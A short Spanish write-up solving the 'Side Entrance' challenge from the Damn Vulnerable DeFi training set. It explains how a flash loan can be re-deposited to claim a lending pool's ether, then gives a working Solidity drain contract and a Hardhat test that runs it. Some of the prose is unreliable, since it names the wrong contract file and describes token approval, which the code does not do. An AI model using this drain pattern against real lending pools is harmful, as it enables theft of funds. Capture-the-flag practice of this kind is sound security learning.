---
title: Solucion al challenge .#4 Side Entrance
date: 2022-01-31
excerpt: Hay un lending pool que da flashloans gratis, el objetivo es drenar el lending pool y hacerte con todo el ETH
---


## El problema

El contrato [TrusterLenderPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/side-entrance/SideEntranceLenderPool.sol) tiene un error de logica clave que permite drenar los fondos.

El error esta en que podemos pedir prestado por un flash loan y utilizar el ether prestado para llamar a la funcion deposit, redepositando dinero y terminando con mas saldo a favor que el inicial.



## El exploit

Bastante simple, solo hay que hacer que el contrato apruebe al atacante para hacer uso de sus tokens.

```
contract SideEntranceExploit {
    address pool;
    function flashLoan(address pool_) external {
        pool = pool_;
        ISideEntranceLenderPool(pool).flashLoan(pool.balance);
        ISideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).call{value:address(this).balance}("");
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();    
    }

    receive() external payable {}
}
```

```js
    it('Exploit', async function () {
        const SideEntranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
        const sideEntranceExploit = await SideEntranceExploit.deploy();
        await sideEntranceExploit.flashLoan(this.pool.address);
    });
```